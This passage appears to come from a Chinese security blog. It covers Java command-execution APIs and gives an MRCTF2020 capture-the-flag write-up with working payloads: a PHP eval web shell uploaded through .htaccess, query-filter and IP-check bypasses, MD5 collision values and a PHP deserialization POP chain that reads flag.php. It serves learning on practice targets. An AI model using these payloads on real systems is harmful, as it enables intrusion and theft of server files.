class="comment">//必须要实现序列化接口才可以进行序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">boolean</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Java命令执行函数"><a href="#Java命令执行函数" class="headerlink" title="Java命令执行函数"></a>Java命令执行函数</h1><h2 id="1-java-lang-Runtime"><a href="#1-java-lang-Runtime" class="headerlink" title="1.java.lang.Runtime"></a>1.java.lang.Runtime</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd /c calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd.exe /k calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        Process start = runtime.exec(<span class="string">&quot;ping sakani.top&quot;</span>);</span><br><span class="line">        InputStream inputStream = start.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] res = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream.read(res);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(res,<span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，第一种方式告诉我们可以用数组来传入命令，第二种则是告诉字符串的方式，第四种则是意味着我们可以执行反弹shell,但是用该方法的时候我只得到了一条ping的数据，如图所示，所以我认为可能并不是很靠谱</p>
<p><img src="image-20201103201813595.png" alt="image-20201103201813595"></p>
<h2 id="2-java-lang-ProcessBuilder"><a href="#2-java-lang-ProcessBuilder" class="headerlink" title="2.java.lang.ProcessBuilder"></a>2.java.lang.ProcessBuilder</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    Process start = processBuilder.start();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe &quot;</span>,<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">    processBuilder.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法也可以成功执行函数，但需要注意的是，使用的时候需要指定两个参数，第一个是执行什么文件，第二个才是命令</p>
<h2 id="3-java-lang-Processlmpl"><a href="#3-java-lang-Processlmpl" class="headerlink" title="3.java.lang.Processlmpl"></a>3.java.lang.Processlmpl</h2><p>这种方法是ProcessBuilder的父类，但是因为其为私有类，我们需要获取的时候只能通过反射的方式来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">    Method start = aClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">    start.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    start.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我比较疑惑的是这里为什么没有使用cmd，直接使用的null，却可以成功得到运行呢？</p>
<p>稍微审计了以下源码，看到了如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Process <span class="title">start</span><span class="params">(String cmdarray[],   //注意这里，传入的就是cmdarray</span></span></span><br><span class="line"><span class="function"><span class="params">                     java.util.Map&lt;String,String&gt; environment,</span></span></span><br><span class="line"><span class="function"><span class="params">                     String dir,</span></span></span><br><span class="line"><span class="function"><span class="params">                     ProcessBuilder.Redirect[] redirects,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">boolean</span> redirectErrorStream)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<p>顺便补充一下反射的几个知识：</p>
<ul>
<li>class.forName用于反射类，指定类名即可</li>
<li>class.getDeclaredMethod 用于映射类中的方法</li>
<li>invoke ，开始调用该方法， 传入参数即可使用</li>
</ul>
<h2 id="4-javax-script-ScriptEngineMana"><a href="#4-javax-script-ScriptEngineMana" class="headerlink" title="4. javax.script.ScriptEngineMana"></a>4. javax.script.ScriptEngineMana</h2><p>本质上还是使用上面的三种方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ScriptException </span>&#123;</span><br><span class="line">    Object scriptEngineManager = <span class="keyword">new</span> ScriptEngineManager().getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line">    System.out.println(scriptEngineManager);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我比较惊讶，为什么输出语句也可以执行命令呢？</p>
]]></content>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/10/29/MRCTF2020/</url>
    <content><![CDATA[<p>怎么说呢。。是新手题目，又不太像，有些题目脑洞有点大</p>
<h1 id="1-套娃"><a href="#1-套娃" class="headerlink" title="1.套娃"></a>1.套娃</h1><p>读源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中可以看见过滤_和%5f，那我们编码绕过就无办法了啊，但是找到参考文献：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html</span><br></pre></td></tr></table></figure>

<p>其中对这种的绕过</p>
<p><img src="image-20201029175514743.png" alt="image-20201029175514743"></p>
<p>于是我们构造空格来绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p>之后在secrettw.php中，JSfcuk翻译即可得到让传值读取源码：</p>
<p><img src="image-20201029175921389.png" alt="image-20201029175921389"></p>
<p>读取到源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>其中对IP进行了一次check，XFF不可用，用Clinet-IP即可绕过</p>
<p><img src="image-20201029180308506.png" alt="image-20201029180308506"></p>
<p>之后看上面的简单函数的逆向，把加号改成减号就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$v = <span class="string">&quot;fj]a&amp;f\b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $v = base64_decode($v);</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (change(<span class="string">&quot;ZmpdYSZmXGI=&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>比较恶心到人的是2333的输出，我之前无论如何输入都不行，一度怀疑人生，最后找到data的伪协议可以绕过，参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043</span><br></pre></td></tr></table></figure>

<p>最后成功拿到flag，flag在源码中：</p>
<p><img src="image-20201029180627670.png" alt="image-20201029180627670"></p>
<h1 id="2-你传你🐎呢"><a href="#2-你传你🐎呢" class="headerlink" title="2.你传你🐎呢"></a>2.你传你🐎呢</h1><p>分别上传.htaccess和一句话即可：</p>
<p><img src="image-20201029182056361.png" alt="image-20201029182056361"></p>
<p>一句话用asp的格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="image-20201029182147837.png" alt="image-20201029182147837"></p>
<p>之后用蚁剑🔗拿flag即可，这道题我比较奇怪的就是过滤了很多东西，但是又没啥用,我猜测是出题人过滤不够？不然可以用disable_function的来做的,过滤如下：k’h’j</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld	</span><br></pre></td></tr></table></figure>

<h1 id="3-Ez-bypass"><a href="#3-Ez-bypass" class="headerlink" title="3.Ez_bypass"></a>3.Ez_bypass</h1><p>MD5强等于绕过和弱等于绕过：</p>
<p><img src="image-20201029190823452.png" alt="image-20201029190823452"></p>
<p>当然也可以用下面这两组数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二步；</p>
<p><img src="image-20201029190903989.png" alt="image-20201029190903989"></p>
<h1 id="4-PYWebsite"><a href="#4-PYWebsite" class="headerlink" title="4.PYWebsite"></a>4.PYWebsite</h1><p><img src="image-20201029190958345.png" alt="image-20201029190958345"></p>
<p>看到这句话，直接伪造XFF即可</p>
<p><img src="image-20201029191040967.png" alt="image-20201029191040967"></p>
<h1 id="5-Ezpop"><a href="#5-Ezpop" class="headerlink" title="5.Ezpop"></a>5.Ezpop</h1><p>首先审计源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我自己审计的时候感觉有点懵，首先我们可能要用到的是include这么一个函数，而var函数会在__invoke的时候去调用$var，进行文件包含，于是我们构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>接着就是去找哪里可以调用到这么一个__invoke方法了，根据PHP的手册，我们会在 函数被当成方法调用的时候自动调用，例子如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$mod();</span><br><span class="line"><span class="comment">//在下面则会自动调用invoke方法</span></span><br></pre></td></tr></table></figure>



<p>往下看就能看见Test方法，因为它返回了一个function。所以让Test去get 一下Modifier类，就会先调用__get方法，结果因为被当成了函数进行调用，我们的Modifier类自动的调用了invoke方法。</p>
<p>然后我卡在这里好久..最后看了师傅们的博客才想到该怎么写..说实话还是有点懵逼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在show函数当中，我们需要找到__wakeup函数，因为它进行了echo操作，此时便会触发string函数</p>
<p>修改source的值。</p>
<p>最后要注意protected属性修饰的变量应该用urlencode进行修饰避免不可见字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"><span class="comment">//    private $c;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$show1 = <span class="keyword">new</span> Show();</span><br><span class="line">$show1 -&gt;str =$test;</span><br><span class="line">$show1-&gt;str-&gt;p = $mod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$show2 = <span class="keyword">new</span> Show($show1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($show2));</span><br><span class="line"><span class="comment">//当我们触发</span></span><br></pre></td></tr></table></figure>



<p>这里就是进行了一个套娃，当反序列化的时候呢，show方法被反序列化，调用了wakeup的函数，之后又因为</p>
<p>__construct,进行了一句输出，所以就造成了toString调用，在此之前我们构造好语句即可</p>
<p>$show2 纯粹的是进行一次wakeup调用！</p>
<p><img src="image-20201029191526057.png" alt="image-20201029191526057"></p>
<h1 id="6-Ezadult"><a href="#6-Ezadult" class="headerlink" title="6.Ezadult"></a>6.Ezadult</h1><p>页面啥也看不出来，直接<a href="http://www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本：">www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本：</a></p>
